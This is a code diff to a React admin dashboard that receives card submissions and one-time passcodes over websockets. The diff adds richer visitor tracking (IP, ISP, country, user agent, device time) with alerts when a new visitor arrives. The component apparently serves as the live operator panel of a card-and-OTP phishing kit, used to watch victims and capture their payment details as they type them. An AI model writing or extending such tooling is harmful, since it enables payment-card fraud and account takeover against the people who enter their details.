@@ -1,4 +1,5 @@
 
+
 import React, { useState, useEffect, useMemo } from 'react';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from './ui/table';
 import { wsClient } from '@/integrations/ws-client';
@@ -30,6 +31,11 @@ interface CardSubmission {
 interface Visitor {
   id: string;
   ip: string;
+  user_agent?: string;
+  isp?: string;
+  country?: string;
+  country_flag?: string;
+  device_time?: string;
   created_at: string;
 }
 
@@ -121,14 +127,53 @@ const AdminPanel = () => {
       console.log('[AdminPanel] Received visitor_update:', visitor);
       const myId = wsClient.getSocketId();
       if (visitor.id === myId) return;
+      
       setActiveVisitors(prev => {
         const isNewVisitor = !prev.find(v => v.id === visitor.id);
-        const updatedVisitors = isNewVisitor ? [...prev, visitor] : prev;
         if (isNewVisitor) {
           setNewVisitorGlow(true);
-          setTimeout(() => setNewVisitorGlow(false), 3000); // Glow for 3 seconds
+          setTimeout(() => setNewVisitorGlow(false), 3000);
+          const updatedVisitor = {
+            ...visitor,
+            ip: visitor.ip || 'Unknown',
+            isp: visitor.isp || 'Unknown ISP',
+            country: visitor.country || 'Unknown',
+            country_flag: visitor.country_flag || '🌍',
+            user_agent: visitor.user_agent || 'Unknown',
+            device_time: visitor.device_time || new Date().toLocaleString()
+          };
+          return [...prev, updatedVisitor];
         }
-        return updatedVisitors;
+        return prev;
+      });
+    };
+
+    const handleEnhancedVisitor = (visitor: Visitor) => {
+      console.log('[AdminPanel] Received enhanced_visitor:', visitor);
+      const myId = wsClient.getSocketId();
+      if (visitor.id === myId) return;
+      
+      setActiveVisitors(prev => {
+        const existingIndex = prev.findIndex(v => v.id === visitor.id);
+        const enhancedVisitor = {
+          ...visitor,
+          ip: visitor.ip || 'Unknown',
+          isp: visitor.isp || 'Unknown ISP',
+          country: visitor.country || 'Unknown',
+          country_flag: visitor.country_flag || '🌍',
+          user_agent: visitor.user_agent || 'Unknown',
+          device_time: visitor.device_time || new Date().toLocaleString()
+        };
+        
+        if (existingIndex >= 0) {
+          const updated = [...prev];
+          updated[existingIndex] = enhancedVisitor;
+          return updated;
+        } else {
+          setNewVisitorGlow(true);
+          setTimeout(() => setNewVisitorGlow(false), 3000);
+          return [...prev, enhancedVisitor];
+        }
       });
     };
 
@@ -162,14 +207,9 @@ const AdminPanel = () => {
 
     // Register all event listeners
     wsClient.on('card_submission', handleCardSubmission);
-
-    // If the socket is already connected (possible if connection event fired before listener registration),
-    // immediately perform the connect handler logic to join the 'admins' room and request any queued data.
-    if (wsClient.socket?.connected) {
-      handleConnect();
-    }
     wsClient.on('otp_submitted', handleOtpSubmitted);
     wsClient.on('visitor_update', handleVisitorUpdate);
+    wsClient.on('enhanced_visitor', handleEnhancedVisitor);
     wsClient.on('visitor_left', handleVisitorLeft);
     wsClient.on('delete_all_transactions', handleDeleteAllTransactions);
     wsClient.on('admin_command', handleAdminCommand);
@@ -203,23 +243,19 @@ const AdminPanel = () => {
     // Cleanup function
     return () => {
       console.log('[AdminPanel] Cleaning up and disconnecting.');
-      // Remove all listeners
       wsClient.off('card_submission', handleCardSubmission);
       wsClient.off('otp_submitted', handleOtpSubmitted);
       wsClient.off('visitor_update', handleVisitorUpdate);
+      wsClient.off('enhanced_visitor', handleEnhancedVisitor);
       wsClient.off('visitor_left', handleVisitorLeft);
       wsClient.off('delete_all_transactions', handleDeleteAllTransactions);
       wsClient.off('admin_command', handleAdminCommand);
       wsClient.socket.off('connect', handleConnect);
       wsClient.socket.off('disconnect', handleDisconnect);
 
-      // Disconnect the socket
       if (wsClient.socket.connected) {
         wsClient.disconnect();
       }
-
-      // Remove favicon
-      document.head.removeChild(favicon);
     };
     }, []);
 
@@ -354,9 +390,6 @@ const AdminPanel = () => {
           visitors={activeVisitors} 
         />
       )}
-
-      {/* Enhanced Visitor Info Component */}
-      <EnhancedVisitorInfo />
 
       {/* Notifications */}
       {notification && (
@@ -540,3 +573,4 @@ const AdminPanel = () => {
 };
 
 export default AdminPanel;
+
